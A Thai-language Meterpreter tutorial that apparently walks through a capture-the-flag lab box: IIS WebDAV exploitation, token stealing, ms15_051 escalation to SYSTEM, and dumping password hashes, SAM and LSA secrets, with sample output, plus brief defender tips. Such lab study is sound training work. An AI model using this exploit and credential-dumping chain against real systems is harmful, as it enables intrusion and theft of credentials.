# Meterpreter - Swiss Army Knife ของ Penetration Testing

## Meterpreter คืออะไร?

**Meterpreter** เป็น Payload พิเศษที่มีความสามารถหลากหลาย มีคุณสมบัติเด่น ดังนี้:

### 🔐 คุณสมบัติหลัก:

1. **ใช้ DLL Injection**
   - ทำให้การเชื่อมต่อมีเสถียรภาพ
   - ยากต่อการตรวจจับด้วยวิธีการธรรมดา

2. **อยู่ในหน่วยความจำเท่านั้น (Memory-Resident)**
   - ไม่เขียนข้อมูลลงฮาร์ดดิสก์
   - ยากต่อการตรวจจับด้วยเทคนิค Forensics ทั่วไป

3. **Persistent**
   - สามารถตั้งค่าให้คงอยู่แม้ระบบ Reboot

4. **การเข้ารหัส AES**
   - การสื่อสารทั้งหมดเข้ารหัสด้วย AES
   - ยากต่อการดักจับข้อมูล

---

## วัตถุประสงค์ของ Meterpreter

Meterpreter ถูกออกแบบมาเพื่อ **ปรับปรุงขั้นตอน Post-Exploitation** โดยให้เครื่องมือที่:

✅ สำรวจระบบเป้าหมายจากภายใน (Enumeration)  
✅ ค้นหาเทคนิค Privilege Escalation  
✅ หลบหลีก Antivirus (AV Evasion)  
✅ วิจัยช่องโหว่เพิ่มเติม  
✅ สร้างการเข้าถึงแบบถาวร (Persistent Access)  
✅ เคลื่อนย้ายไปยังระบบอื่น (Pivot)

---

## กลไกการทำงานของ Meterpreter

### ขั้นตอนเมื่อ Exploit สำเร็จ:

```
1. Target รัน Initial Stager
   ↓
2. Stager โหลด DLL แบบ Reflective
   ↓
3. Meterpreter Core เริ่มทำงาน + สร้างลิงก์ AES
   ↓
4. ส่ง GET Request ไปยัง Metasploit
   ↓
5. โหลด Extensions (stdapi, priv)
```

**หมายเหตุ:** การโหลด Extensions ทั้งหมดเข้ารหัสด้วย AES

---

## หลักการออกแบบ Meterpreter (Design Goals)

### 1. **Stealthy (ลับลมคมใน)** 🥷

- **อยู่ใน Memory เท่านั้น** - ไม่เขียนลงดิสก์
- **ไม่สร้าง Process ใหม่** - ฉีดตัวเองเข้าไปใน Process ที่มีอยู่แล้ว
- **Process Migration** - สามารถย้ายไปยัง Process อื่นได้
- **การเข้ารหัส AES** - สื่อสารแบบเข้ารหัสทั้งหมด
- **หลักฐาน Forensics น้อยมาก** - ทิ้งร่องรอยน้อย

### 2. **Powerful (ทรงพลัง)** 💪

- **ระบบ Communication แบบ Channelized**
- สามารถเปิด Shell ของ OS ได้ทันทีผ่าน Channel เฉพาะ
- รองรับการเข้ารหัสทราฟฟิกด้วย AES

### 3. **Extensible (ขยายได้)** 🔧

- **เพิ่มฟีเจอร์ได้ตลอดเวลา** (Runtime)
- **โหลดผ่านเครือข่าย** - ไม่ต้อง Rebuild
- **โครงสร้างแบบ Modular** - เพิ่มฟังก์ชันใหม่ได้ง่าย

---

## คำสั่งพื้นฐานใน Meterpreter

### Core Commands (คำสั่งหลัก)

```bash
meterpreter > help

Core Commands
=============
    ?                         # Help menu
    background / bg           # วาง Session ไว้เบื้องหลัง
    exit / quit              # ออกจาก Meterpreter
    
    migrate                   # ย้ายไปยัง Process อื่น
    getuid                    # ดูชื่อผู้ใช้ปัจจุบัน
    sysinfo                   # ดูข้อมูลระบบ
    
    load                      # โหลด Extension
    run                       # รัน Script หรือ Post Module
    resource                  # รันคำสั่งจากไฟล์
    
    sessions                  # สลับไปยัง Session อื่น
    channel                   # จัดการ Channels
```

---

## ตัวอย่างการใช้งานจริง

### 1. การสแกนและค้นหาเป้าหมาย

```bash
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

# ผลลัพธ์:
# PORT   STATE SERVICE VERSION
# 80/tcp open  http    Microsoft IIS httpd 6.0
```

**การวิเคราะห์:**
- เจอ IIS version 6.0
- มีช่องโหว่ CVE-2017-7269
- มี Metasploit Module พร้อมใช้งาน

---

### 2. ค้นหาและใช้ Exploit

```bash
msf6 > search iis_webdav_upload_asp

msf6 > use exploit/windows/iis/iis_webdav_upload_asp
msf6 > set RHOST 10.10.10.15
msf6 > set LHOST tun0
msf6 > run

[*] Meterpreter session 1 opened
meterpreter >
```

---

### 3. ตรวจสอบสิทธิ์และ Process Migration

```bash
meterpreter > getuid
[-] Operation failed: Access is denied.

meterpreter > ps    # แสดง Process ทั้งหมด

 PID   Name               User
 ---   ----               ----
 1836  wmiprvse.exe       NT AUTHORITY\NETWORK SERVICE
 3552  w3wp.exe           NT AUTHORITY\NETWORK SERVICE

meterpreter > steal_token 1836
Stolen token with username: NT AUTHORITY\NETWORK SERVICE

meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

**คำอธิบาย:**
- เริ่มต้นไม่มีสิทธิ์เข้าถึง
- ใช้ `ps` ดู Process ที่มี
- ใช้ `steal_token` ขโมย Token จาก Process อื่น
- ได้สิทธิ์ NETWORK SERVICE

---

### 4. Privilege Escalation ด้วย Local Exploit Suggester

```bash
meterpreter > bg    # Background Session

msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 1
msf6 > run

[+] exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
```

**ใช้ Exploit ที่แนะนำ:**

```bash
msf6 > use exploit/windows/local/ms15_051_client_copy_image
msf6 > set SESSION 1
msf6 > set LHOST tun0
msf6 > run

[*] Meterpreter session 2 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM   # ได้สิทธิ์ SYSTEM แล้ว!
```

---

### 5. Post-Exploitation - ดึง Credentials

#### 🔑 Dump Password Hashes

```bash
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
```

#### 🗝️ Dump SAM Database

```bash
meterpreter > lsa_dump_sam

Domain : GRANNY
Local SID : S-1-5-21-1709780765-3897210020-3926566182

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000003f1 (1009)
User : Lakis
  Hash NTLM: 3064b6fc432033870c6730228af7867c
```

#### 🔐 Dump LSA Secrets

```bash
meterpreter > lsa_dump_secrets

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3...
```

---

## ⚠️ จุดที่ต้องระวัง

### 1. **ไฟล์ที่เหลือทิ้งไว้**

```bash
[*] Uploading 612435 bytes to /metasploit28857905.txt...
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
```

**ปัญหา:**
- ไฟล์ `.asp` ถูกทิ้งไว้บนเซิร์ฟเวอร์
- Sysadmin สามารถตรวจพบได้
- ควรลบด้วยตนเองหรือใช้ Payload แบบ Stageless

**วิธีป้องกัน (สำหรับ Defender):**
- ตรวจหาไฟล์ที่มีชื่อแบบ `metasploit[ตัวเลข].asp`
- ใช้ Regex Pattern Detection
- Block การรัน Meterpreter ก่อนจะ Spawn Shell

---

